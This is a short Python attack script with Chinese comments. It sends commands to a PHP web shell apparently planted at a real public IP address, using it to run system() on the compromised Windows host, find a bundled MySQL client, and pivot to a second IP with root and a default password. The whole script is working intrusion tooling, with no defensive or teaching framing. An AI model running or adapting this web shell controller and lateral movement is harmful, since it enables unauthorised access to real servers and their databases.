#!/usr/bin/env python3
"""81.70 用本地 mysql.exe 客户端连 124.71 (phpStudy自带)"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=40):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 1. 找 mysql.exe
r = cmd("system('dir /s /b C:/phpStudy/MySQL/bin/mysql.exe 2>nul');", 30)
print("1. mysql.exe:", r.strip()[-120:], flush=True)

# 2. 用 mysql.exe 连 124.71 (带超时, 输出重定向)
r = cmd("system('C:/phpStudy/MySQL/bin/mysql.exe -h 124.71.142.158 -u root -p123456 -e \"SELECT 1\" 2>&1');", 40)
print("2. 连接:", r.strip()[-120:], flush=True)
